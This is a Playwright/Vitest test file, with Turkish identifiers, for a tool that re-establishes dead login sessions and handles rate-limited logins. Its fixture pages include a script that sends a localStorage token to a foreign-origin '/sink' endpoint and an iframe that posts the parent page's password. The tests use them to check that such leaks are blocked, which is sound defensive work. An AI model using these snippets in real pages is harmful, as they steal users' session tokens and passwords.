import { randomBytes } from 'node:crypto';
import { access, readFile, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import { dirname, join } from 'node:path';
import { chromium } from '@playwright/test';
import { afterAll, beforeAll, beforeEach, describe, expect, it, type TestContext } from 'vitest';
import { KobayDizini, yazAtomik, type TestKaydi } from '../../src/depo/index.js';
import { iceAlinanOturumMetni } from '../../src/kesif/oturum-dosyasi.js';
import { kostur } from '../../src/kos/index.js';
import { geciciDizinAc } from '../yardimci/gecici-dizin.js';

/**
 * 0.8.0 Ş1 P1-2: oturum koşu ortasında ölür (Vikunja: 600 sn erişim jetonu, tek kullanımlık
 * yenileme çerezi). Yerel uygulama: `sid` çerezi sunucuda tutulur; `/api/kill` hepsini öldürür,
 * `donen` kipinde her `/api/me` çerezi döndürür (eskisi ölür). SPA: `/` oturum yoksa `/login`'e gider.
 */

const KULLANICI = 'oturum-kullanici';
const PAROLA = 'oturum-parola-13579';
const kati = process.env.KOBAY_TEST_STRICT === '1';
let tarayiciEngeli: unknown;
let sunucu: Server | undefined;
let baseUrl = '';
const durum = {
  tokenlar: new Set<string>(), donen: false, girisSayisi: 0, yanlisDugme: 0, meSayisi: 0,
  /** Ret PRG ile: yanlış parolada `/login?error=bad`'e yönlenir (URL değişir). */
  prg: false,
  /** Pano, localStorage jetonunu yabancı origin'e (localhost) gönderir. */
  sizdir: false,
  /** Pano açılır pencere açar (yabancı origin). */
  acilir: false,
  /** Yabancı alıcıya (`localhost` `/sink`, `/disari`) gelen istek sayısı. */
  alici: 0,
  /** Yabancı alıcıya yerel jetonla (`yerel-jeton-…`) gelen istek sayısı. */
  jetonluAlici: 0,
  /** Başarılı giriş zorunlu parola değiştirme sayfasına yönlenir. */
  sifreDegistir: false,
  /** Başarılı giriş başka yolda kullanıcı adı + parola formu olan profil sayfasına yönlenir (B2). */
  profil: false,
  /** Giriş düğmesi kilitli (captcha gibi): gönderen düğme `disabled` (B5). */
  kilitli: false,
  /** P2-3: `/api/login` hız sınırıyla reddeder (HTTP 429, `Retry-After: 30`). */
  hizSiniri: false,
  /**
   * P2-3: ret (401) sonrası sayfa "Too Many Requests" yazar; ana çerçeve parolasız GET + POST
   * `/api/limit`, aynı-köken iframe parolalı POST `/api/limit` gönderir (hepsi 429; sahte işaret).
   */
  sahteHizSiniri: false,
  /** P2-3: klasik form `action="/session"` POST'u 429 sayfasına gider (URL değişir). */
  formHiz: false,
  /** P2-3 tur 3: klasik form `action="/session302"` → 302 → GET `/rate-limit` = 429. */
  formHiz302: false,
  /** P2-3 tur 3: SPA önce `pushState('/dashboard')`, giriş POST'u 3 sn sonra 429 döner. */
  gecHiz: false,
};
let yabanciOrigin = '';

function yeniToken(): string {
  const token = randomBytes(16).toString('hex');
  durum.tokenlar.add(token);
  return token;
}

function cerezToken(baslik: string | undefined): string | undefined {
  return /(?:^|;\s*)sid=([^;]+)/.exec(baslik ?? '')?.[1];
}

function ana(): string {
  const ek = (durum.sizdir ? `fetch(${JSON.stringify(`${yabanciOrigin}/sink`)} + "?t=" + localStorage.getItem("tok"), { mode: "no-cors" });` : '')
    + (durum.acilir ? `window.open(${JSON.stringify(`${yabanciOrigin}/disari`)});` : '');
  return '<h1 id="durum">loading</h1><script>fetch("/api/me").then((y) => {'
    + ' if (y.status === 401) location.href = "/login"; else document.querySelector("#durum").textContent = "Dashboard"; });'
    + `${ek}</script>`;
}
/** Zorunlu parola değiştirme sayfası: parola alanları var ama giriş formu değil, yolu da başka. */
const SIFRE_DEGISTIR = '<h1>Change your password</h1><form><input type="password" id="eski"><input type="password" id="yeni">'
  + '<button type="submit">Save</button></form>';
/** Profil sayfası: giriş formu biçiminde (kullanıcı adı + parola + gönder) ama giriş yolunda değil. */
const PROFIL = '<h1>Your profile</h1><form onsubmit="event.preventDefault()"><input type="text" id="ad">'
  + '<input type="password" id="onay"><button type="submit">Save</button></form>';
/** P2-3: klasik form gönderimi; `/session` hız sınırında 429 sayfası döner. */
const FORM_HIZ = '<h1>Sign in</h1><form action="/session" method="post"><input name="u" type="text"><input name="p" type="password">'
  + '<button type="submit">Log in</button></form>';
const FORM_HIZ_302 = FORM_HIZ.replace('action="/session"', 'action="/session302"');
/** SPA: tıklamada hemen `pushState`, giriş isteği geç yanıtlanır (429). */
const GEC_HIZ = '<h1>Sign in</h1><form id="gf"><input id="u" type="text"><input id="p" type="password">'
  + '<button type="button" id="giris">Login</button></form><script>document.querySelector("#giris").addEventListener("click", () => {'
  + ' history.pushState({}, "", "/dashboard"); fetch("/api/login-gec", { method: "POST",'
  + ' body: JSON.stringify({ u: document.querySelector("#u").value, p: document.querySelector("#p").value }) }); });</script>';
/** P2-3: aynı-köken iframe, üst sayfanın parolasını gövdesinde taşıyan POST gönderir (429 alır). */
const CERCEVE_POST = '<p>frame</p><script>fetch("/api/limit", { method: "POST",'
  + ' body: JSON.stringify({ p: parent.document.querySelector("#p").value }) });</script>';
const KILITLI = '<h1>Sign in</h1><form action="/login" method="post"><input name="u" type="text"><input name="p" type="password">'
  + '<button type="submit" disabled title="Complete the security check first">Log in</button></form>';
const GIRIS = '<h1>Sign in</h1><form id="loginform"><input id="u" type="text"><input id="p" type="password">'
  + '<button type="button" aria-label="Show the password" id="goz">o</button>'
  + '<button type="button" id="giris">Login</button></form><script>'
  + 'document.querySelector("#goz").addEventListener("click", () => fetch("/api/yanlis"));'
  + 'document.querySelector("#giris").addEventListener("click", () => fetch("/api/login", { method: "POST",'
  + ' body: JSON.stringify({ u: document.querySelector("#u").value, p: document.querySelector("#p").value }) })'
  + '.then((y) => { if (y.ok) { localStorage.setItem("tok", "yerel-jeton-" + Date.now());'
  + ' location.href = window.SIFRE ? "/account/change-password" : window.PROFIL ? "/account/profile" : "/"; }'
  + ' else if (window.PRG) location.href = "/login?error=bad";'
  + ' else if (window.SAHTE429) { fetch("/api/limit"); fetch("/api/limit", { method: "POST", body: "{}" });'
  + ' const f = document.createElement("iframe"); f.src = "/cerceve-post"; document.body.append(f); const d = document.createElement("div"); d.setAttribute("role", "alert");'
  + ' d.textContent = "Too Many Requests (429). Wait a minute."; document.querySelector("#loginform").append(d); } }));</script>';

beforeAll(async () => {
  try {
    const tarayici = await chromium.launch({ headless: true });
    await tarayici.close();
  } catch (hata: unknown) {
    tarayiciEngeli = hata;
    return;
  }
  sunucu = createServer((istek, yanit) => {
    const yol = new URL(istek.url ?? '/', 'http://x').pathname;
    const token = cerezToken(istek.headers.cookie);
    if (yol === '/api/login' && istek.method === 'POST') {
      let govde = '';
      istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
      istek.on('end', () => {
        if (durum.hizSiniri) { yanit.writeHead(429, { 'retry-after': '30' }).end('Too Many Requests'); return; }
        const veri = JSON.parse(govde) as { u: string; p: string };
        if (veri.u !== KULLANICI || veri.p !== PAROLA) { yanit.writeHead(401).end(); return; }
        durum.girisSayisi += 1;
        yanit.writeHead(200, { 'set-cookie': `sid=${yeniToken()}; Path=/; HttpOnly` }).end('{}');
      });
      return;
    }
    if (yol === '/api/me') {
      durum.meSayisi += 1;
      if (token === undefined || !durum.tokenlar.has(token)) { yanit.writeHead(401).end(); return; }
      if (durum.donen) {
        durum.tokenlar.delete(token);
        yanit.writeHead(200, { 'set-cookie': `sid=${yeniToken()}; Path=/; HttpOnly` }).end('{}');
        return;
      }
      yanit.writeHead(200).end('{}');
      return;
    }
    if (yol === '/session' && istek.method === 'POST') {
      yanit.writeHead(429, { 'content-type': 'text/html', 'retry-after': '30' }).end('<!doctype html><h1>Too Many Requests</h1>');
      return;
    }
    if (yol === '/session302' && istek.method === 'POST') { yanit.writeHead(302, { location: '/rate-limit' }).end(); return; }
    if (yol === '/rate-limit') {
      yanit.writeHead(429, { 'content-type': 'text/html', 'retry-after': '30' }).end('<!doctype html><h1>Too Many Requests</h1>');
      return;
    }
    if (yol === '/api/login-gec' && istek.method === 'POST') {
      setTimeout(() => { yanit.writeHead(429, { 'retry-after': '30' }).end(); }, 3_000);
      return;
    }
    if (yol === '/api/limit') { yanit.writeHead(429, { 'retry-after': '30' }).end(); return; }
    if (yol === '/api/kill') { durum.tokenlar.clear(); yanit.writeHead(200).end(); return; }
    if (yol === '/sink' || yol === '/disari') {
      durum.alici += 1;
      if ((istek.url ?? '').includes('yerel-jeton-')) durum.jetonluAlici += 1;
      yanit.writeHead(200).end('ok');
      return;
    }
    if (yol === '/api/yanlis') { durum.yanlisDugme += 1; yanit.writeHead(200).end(); return; }
    const giris = durum.kilitli ? KILITLI : durum.formHiz ? FORM_HIZ : durum.formHiz302 ? FORM_HIZ_302 : durum.gecHiz ? GEC_HIZ : `${durum.prg ? '<script>window.PRG = 1</script>' : ''}`
      + `${durum.sahteHizSiniri ? '<script>window.SAHTE429 = 1</script>' : ''}${durum.sifreDegistir ? '<script>window.SIFRE = 1</script>' : ''}${durum.profil ? '<script>window.PROFIL = 1</script>' : ''}${GIRIS}`;
    const sayfalar: Record<string, string> = { '/login': giris, '/cerceve-post': CERCEVE_POST, '/account/change-password': SIFRE_DEGISTIR, '/account/profile': PROFIL };
    const govde = yol === '/' ? ana() : sayfalar[yol] ?? '<h1>yok</h1>';
    yanit.writeHead(200, { 'content-type': 'text/html' });
    yanit.end(`<!doctype html><html><body>${govde}</body></html>`);
  });
  await new Promise<void>((coz) => { sunucu?.listen(0, '127.0.0.1', () => { coz(); }); });
  const adres = sunucu.address();
  if (adres === null || typeof adres === 'string') throw new Error('adres yok');
  baseUrl = `http://127.0.0.1:${adres.port}`;
  // Ayrı site: `localhost` ile `127.0.0.1` aynı site değildir.
  yabanciOrigin = `http://localhost:${adres.port}`;
});

afterAll(async () => {
  if (sunucu?.listening) await new Promise((coz) => { sunucu?.close(coz); });
});

beforeEach(() => {
  durum.tokenlar.clear();
  durum.donen = false;
  durum.girisSayisi = 0;
  durum.yanlisDugme = 0;
  durum.meSayisi = 0;
  durum.prg = false;
  durum.sizdir = false;
  durum.acilir = false;
  durum.alici = 0;
  durum.sifreDegistir = false;
  durum.profil = false;
  durum.kilitli = false;
  durum.jetonluAlici = 0;
  durum.hizSiniri = false;
  durum.sahteHizSiniri = false;
  durum.formHiz = false;
  durum.formHiz302 = false;
  durum.gecHiz = false;
});

function mumkun(context: TestContext): boolean {
  if (tarayiciEngeli === undefined) return true;
  const ozet = String(tarayiciEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium atlanamaz: ${ozet}`);
  context.skip(`Chromium engelli: ${ozet}`);
  return false;
}

const TEST: TestKaydi = {
  id: 't_oturum01', name: 'dashboard opens', type: 'frontend', createdFrom: 'cli', status: 'ready', priority: 'p1',
  codeVersion: 1, planSteps: [{ type: 'assertion', description: 'Open the dashboard' }],
  createdAt: '2026-11-08T00:00:00.000Z', updatedAt: '2026-11-08T00:00:00.000Z',
};

/** Pano testi. `oldur`: adımın ortasında sunucudaki tüm oturumları öldürüp sayfayı yeniler. `yazi`: beklenen başlık. */
function kod(secenek: { oldur?: boolean; yazi?: string; yol?: string; sonra?: string; bekleme?: number; iz?: string } = {}): string {
  // `iz`: test, fixture'ın oturum izi dosyasını kendisi yazar (sahte iz), sonra oturumları öldürür.
  const iz = secenek.iz === undefined ? '' : `writeFileSync(join(process.env.KOBAY_RUN_DIR ?? '', 'session-check.json'), ${JSON.stringify(secenek.iz)});
    await page.request.get('${baseUrl}/api/kill');`;
  return `import { test, expect } from './_fixture';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
test('dashboard opens', async ({ page }) => {
  await test.step('0: Open the dashboard', async () => {
    ${iz}
    await page.goto('${baseUrl}${secenek.yol ?? '/'}');
    ${secenek.oldur === true ? `await expect(page.locator('#durum')).toHaveText('Dashboard');
    await page.request.get('${baseUrl}/api/kill');
    await page.reload();` : ''}
    await expect(page.locator('h1').first()).toHaveText('${secenek.yazi ?? 'Dashboard'}', { timeout: ${secenek.bekleme ?? 3_000} });
    ${secenek.sonra === undefined ? '' : `await page.goto('${baseUrl}${secenek.sonra}');
    await expect(page.locator('h1').first()).toHaveText('Wrong heading', { timeout: 2_000 });`}
  });
});
`;
}

async function proje(kimlik: boolean, spec = kod()): Promise<KobayDizini> {
  const dizin = await KobayDizini.ac(await geciciDizinAc('kobay-oturum-'), { baseUrl, beyin: { adaptor: 'sahte' } });
  if (kimlik) await dizin.kimlikYaz({ username: KULLANICI, password: PAROLA, origin: baseUrl });
  await Promise.all([dizin.testYaz(TEST), dizin.kodYaz(TEST.id, spec)]);
  return dizin;
}

function kos(dizin: KobayDizini, storageStateYolu?: string, testZamanAsimiMs = 20_000): ReturnType<typeof kostur> {
  return kostur(dizin, TEST, { baseUrl, testZamanAsimiMs, ...(storageStateYolu === undefined ? {} : { storageStateYolu }) });
}

/** `--session-file` ile içe alınmış (işaretli) oturum dosyası; `sid` çerezi. */
async function iceAlinmisOturumYaz(dizin: KobayDizini, token: string): Promise<string> {
  const metin = iceAlinanOturumMetni({
    cookies: [{ name: 'sid', value: token, domain: '127.0.0.1', path: '/', expires: -1, httpOnly: true, secure: false, sameSite: 'Lax' }],
    origins: [],
  });
  await yazAtomik(dizin.storageStateYolu(), metin, 0o600);
  return metin;
}

describe('P1-2: kayıtlı kimlikle koşu öncesi yeniden giriş (gerçek Chromium)', () => {
  it('oturum dosyası yoksa koşudan önce giriş yapılır (type=button "Login", göz düğmesine basılmaz), test geçer', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(1);
    expect(durum.yanlisDugme).toBe(0);
    await access(dizin.storageStateYolu());
  });

  it('ölmüş oturum (sunucu tüm jetonları sildi) koşudan önce yenilenir, test geçer', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    expect((await kos(dizin)).sonuc.verdict).toBe('passed');
    durum.tokenlar.clear();
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(2);
  });

  it('geçerli oturumda yeniden giriş yok; yoklamanın döndürdüğü çerez dosyaya geri yazılır (tek kullanımlık çerez)', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    expect((await kos(dizin)).sonuc.verdict).toBe('passed');
    durum.donen = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(1);
  });

  it('reddedilen yeniden giriş: koşu yok, env + kimlik komutu, oturum dosyası kalmaz', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    await dizin.kimlikYaz({ username: KULLANICI, password: 'yanlis-parola-000', origin: baseUrl });
    await writeFile(dizin.storageStateYolu(), JSON.stringify({ cookies: [], origins: [] }));
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('logging in again with the saved credentials failed');
    expect(sonuc.errorMessage).toContain('`kobay project update --login`');
    expect(sonuc.errorMessage).not.toContain('yanlis-parola-000');
    await expect(access(dizin.storageStateYolu())).rejects.toThrow();
  });

  it('P2-1: PRG ret (`/login?error=bad`, URL değişir) başarı sayılmaz: env, oturum dosyası kalmaz', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    durum.prg = true;
    await dizin.kimlikYaz({ username: KULLANICI, password: 'yanlis-parola-000', origin: baseUrl });
    await writeFile(dizin.storageStateYolu(), JSON.stringify({ cookies: [], origins: [] }));
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('logging in again with the saved credentials failed');
    await expect(access(dizin.storageStateYolu())).rejects.toThrow();
  });

  it('P2-3: hız sınırıyla (HTTP 429) reddedilen yeniden giriş: env, bekle + rerun; oturum ve kimlik dosyası silinmez', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    const eski = JSON.stringify({ cookies: [], origins: [] });
    await writeFile(dizin.storageStateYolu(), eski);
    const kimlikOnce = await readFile(join(dirname(dizin.storageStateYolu()), 'credentials.json'), 'utf8');
    durum.hizSiniri = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('refused by the app\'s rate limit (HTTP 429');
    expect(sonuc.errorMessage).toContain('about 30 s (the app\'s Retry-After)');
    expect(sonuc.errorMessage).toContain(`\`kobay test rerun ${TEST.id}\``);
    expect(sonuc.errorMessage).not.toContain('kobay project update --login');
    expect(sonuc.errorMessage).not.toContain(PAROLA);
    expect(await readFile(dizin.storageStateYolu(), 'utf8')).toBe(eski);
    expect(await readFile(join(dirname(dizin.storageStateYolu()), 'credentials.json'), 'utf8')).toBe(kimlikOnce);
    // Sınır kalkınca aynı kimlikle sonraki koşu geçer.
    durum.hizSiniri = false;
    expect((await kos(dizin)).sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(1);
  });

  it('P2-3: form action POST\'u 429 sayfasına giderse (URL değişir) giriş başarılı sayılmaz: env, dosya aynen kalır', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    const eski = JSON.stringify({ cookies: [], origins: [] });
    await writeFile(dizin.storageStateYolu(), eski);
    durum.formHiz = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('refused by the app\'s rate limit (HTTP 429');
    expect(await readFile(dizin.storageStateYolu(), 'utf8')).toBe(eski);
  });

  it('P2-3 tur 3: parolalı POST → 302 → GET 429 zinciri de hız sınırıdır: giriş başarılı sayılmaz, dosya aynen kalır', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    const eski = JSON.stringify({ cookies: [], origins: [] });
    await writeFile(dizin.storageStateYolu(), eski);
    durum.formHiz302 = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('refused by the app\'s rate limit (HTTP 429');
    expect(await readFile(dizin.storageStateYolu(), 'utf8')).toBe(eski);
  });

  it('P2-3 tur 3: erken pushState + 3 sn sonra gelen 429: giriş başarılı sayılmaz, dosya aynen kalır', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    const eski = JSON.stringify({ cookies: [], origins: [] });
    await writeFile(dizin.storageStateYolu(), eski);
    durum.gecHiz = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('refused by the app\'s rate limit (HTTP 429');
    expect(await readFile(dizin.storageStateYolu(), 'utf8')).toBe(eski);
  });

  it('P2-3: sayfa metni "Too Many Requests" + parolasız GET/POST 429 + iframe\'in parolalı POST 429\'u sayılmaz: yanlış kimlik reddi, dosya silinir', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    durum.sahteHizSiniri = true;
    await dizin.kimlikYaz({ username: KULLANICI, password: 'yanlis-parola-000', origin: baseUrl });
    await writeFile(dizin.storageStateYolu(), JSON.stringify({ cookies: [], origins: [] }));
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('Too Many Requests');
    expect(sonuc.errorMessage).toContain('`kobay project update --login`');
    expect(sonuc.errorMessage).not.toContain('rate limit');
    await expect(access(dizin.storageStateYolu())).rejects.toThrow();
  });

  it('P1-1: yoklamada pano yüklü oturumun jetonunu yabancı siteye gönderirse istek kesilir', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    expect((await kos(dizin)).sonuc.verdict).toBe('passed');
    durum.sizdir = true;
    await kos(dizin);
    // Üretilen testin kendi bağlamı bilinçli olarak korumasızdır ve jetonu bir kez gönderir. kobay'ın
    // yoklaması (yüklü oturumla) hiç göndermez; yeniden girişin giriş öncesi isteği jeton taşımaz.
    expect(durum.jetonluAlici).toBe(1);
  });

  it('P1-1: yoklamada açılır pencere açılırsa geri yazım yok; yeniden giriş de yabancı pencereyle reddedilir', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    expect((await kos(dizin)).sonuc.verdict).toBe('passed');
    durum.acilir = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toContain('The saved session no longer works and logging in again failed:');
  });

  it('P1-3: projenin kendi dosyası olmayan oturum yolu yenilenmez, yazılmaz, silinmez', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    const ozel = `${dizin.kok}-ozel-oturum.json`;
    const metin = JSON.stringify({ cookies: [], origins: [] });
    await writeFile(ozel, metin);
    await kos(dizin, ozel);
    expect(await readFile(ozel, 'utf8')).toBe(metin);
    expect(durum.girisSayisi).toBe(0);
    await expect(access(dizin.storageStateYolu())).rejects.toThrow();
  });

  it('P1-2: döner çerezde gerçek hata (parola alanlı sayfa) gizlenmez: failed kalır', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true, kod({ sonra: '/login' }));
    durum.donen = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('failed');
    expect(sonuc.failureKind).toBeUndefined();
  });

  it('tur 3: giriş zorunlu parola değiştirme sayfasına yönlenirse ret değil; oturum yazılır, test geçer', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    durum.sifreDegistir = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(1);
    await access(dizin.storageStateYolu());
  });

  it('B2: giriş başka yolda kullanıcı adı + parola formu olan sayfaya yönlenirse ret değil; oturum yazılır', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    durum.profil = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(1);
    await access(dizin.storageStateYolu());
  });

  it('B5: ilk koşuda (oturum yok) kilitli giriş: mesaj "kayıtlı oturum" demez, yalnız kendi --session-file yolunu söyler', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    durum.kilitli = true;
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage).toMatch(/^Logging in before the run failed: Login could not be submitted/);
    expect(sonuc.errorMessage).toContain('--session-file <file>');
    expect(sonuc.errorMessage).not.toContain('saved session');
    expect(sonuc.errorMessage).not.toContain('kobay project update --login');
  }, 60_000);

  it('B5: ilk koşuda reddedilen giriş "Logging in before the run with the saved credentials failed" der', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    await dizin.kimlikYaz({ username: KULLANICI, password: 'yanlis-parola-000', origin: baseUrl });
    const { sonuc } = await kos(dizin);
    expect(sonuc.errorMessage).toMatch(/^Logging in before the run with the saved credentials failed\./);
    expect(sonuc.errorMessage).toContain('`kobay project update --login`');
  });

  it('tur 3: testin yazdığı geçersiz iz (fazla alan, aşırı boy) düşüşü tek başına env yapmaz', async (context) => {
    if (!mumkun(context)) return;
    for (const iz of ['{"loginPage":true,"x":1}', `{"loginPage":true}${' '.repeat(80)}`]) {
      const dizin = await proje(true, kod({ iz, yol: '/yok', yazi: 'Wrong heading' }));
      const { sonuc } = await kos(dizin);
      expect(sonuc.verdict, iz.slice(0, 30)).toBe('failed');
    }
  });

  it('tur 3: geçerli sahte iz, diskteki oturum canlıysa düşüşü env yapmaz (iki kanıt gerekir)', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true, kod({ yol: '/yok', yazi: 'Wrong heading' }).replace(
      "    await page.goto(", "    writeFileSync(join(process.env.KOBAY_RUN_DIR ?? '', 'session-check.json'), '{\"loginPage\":true}');\n    await page.goto(",
    ));
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('failed');
  });

  it('tur 3: test kendi süresini doldurunca da oturum izi yazılır (fixture kendi süresiyle söker)', async (context) => {
    if (!mumkun(context)) return;
    // Belirlenimci: test giriş ekranında beklerken 4 sn'lik süresi HER ZAMAN dolar (timedOut); duvar
    // saati yarışı yok. İz söküm sırasında yazılmalı.
    const spec = kod().replace(
      "    await expect(page.locator('h1').first()).toHaveText('Dashboard', { timeout: 3000 });",
      "    await page.waitForURL('**/login');\n    await page.waitForTimeout(60_000);",
    );
    expect(spec).toContain('waitForTimeout(60_000)');
    const dizin = await proje(false, spec);
    await iceAlinmisOturumYaz(dizin, 'oluoluoluoluoluoluolu0123456789ab');
    const { sonuc } = await kos(dizin, undefined, 4_000);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
  });

  it('P2-2: aynı süreçte eşzamanlı iki koşu ölü oturumu bir kez yeniler', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true);
    await writeFile(dizin.storageStateYolu(), JSON.stringify({ cookies: [], origins: [] }));
    const [a, b] = await Promise.all([kos(dizin), kos(dizin)]);
    expect(a.sonuc.verdict).toBe('passed');
    expect(b.sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(1);
  });

  it('oturum test ortasında ölürse: env, sonuçsuz, "kobay test rerun"; sonraki koşu yeniden girişle geçer', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true, kod({ oldur: true }));
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env', failedStepIndex: 0 });
    expect(sonuc.errorMessage?.split('\n')[0]).toContain('The saved login session stopped working during this run');
    expect(sonuc.errorMessage).toContain(`\`kobay test rerun ${TEST.id}\``);
    expect(sonuc.errorMessage).not.toMatch(/_fixture/);

    await dizin.kodYaz(TEST.id, kod());
    const ikinci = await kos(dizin);
    expect(ikinci.sonuc.verdict).toBe('passed');
    expect(durum.girisSayisi).toBe(2);
  });

  it('oturum geçerliyken giriş sayfasında düşen test oturum düşüşü sayılmaz (failed kalır)', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true, kod({ yol: '/login', yazi: 'Wrong heading' }));
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('failed');
    expect(sonuc.failureKind).toBeUndefined();
  });

  it('oturum geçerliyken panoda düşen test failed kalır (yoklama yapılmaz)', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(true, kod({ yazi: 'Wrong heading' }));
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('failed');
  });
});

describe('P1-2: içe alınan oturum yenilenmez (gerçek Chromium)', () => {
  it('ölmüş içe alınan oturum: env, sonuçsuz, "kobay explore --session-file"; dosyaya dokunulmaz, giriş yok', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(false);
    const metin = await iceAlinmisOturumYaz(dizin, 'oluoluoluoluoluoluolu0123456789ab');
    const { sonuc } = await kos(dizin);
    expect(sonuc).toMatchObject({ verdict: 'inconclusive', failureKind: 'env' });
    expect(sonuc.errorMessage?.split('\n')[0]).toContain('The imported session no longer works');
    expect(sonuc.errorMessage).toContain('kobay does not refresh imported sessions');
    expect(sonuc.errorMessage).toContain('`kobay explore --session-file <file>`');
    expect(await readFile(dizin.storageStateYolu(), 'utf8')).toBe(metin);
    expect(durum.girisSayisi).toBe(0);
  });

  it('giriş ekranı olmayan adımda düşen test oturumu yoklamaz (içe alınan çerez boşuna harcanmaz)', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(false, kod({ yazi: 'Wrong heading' }));
    await iceAlinmisOturumYaz(dizin, yeniToken());
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('failed');
    expect(durum.meSayisi).toBe(1);
  });

  it('geçerli içe alınan oturumla test geçer; dosya aynen kalır (döndürme geri yazılmaz)', async (context) => {
    if (!mumkun(context)) return;
    const dizin = await proje(false);
    const metin = await iceAlinmisOturumYaz(dizin, yeniToken());
    const { sonuc } = await kos(dizin);
    expect(sonuc.verdict).toBe('passed');
    expect(await readFile(dizin.storageStateYolu(), 'utf8')).toBe(metin);
  });
});
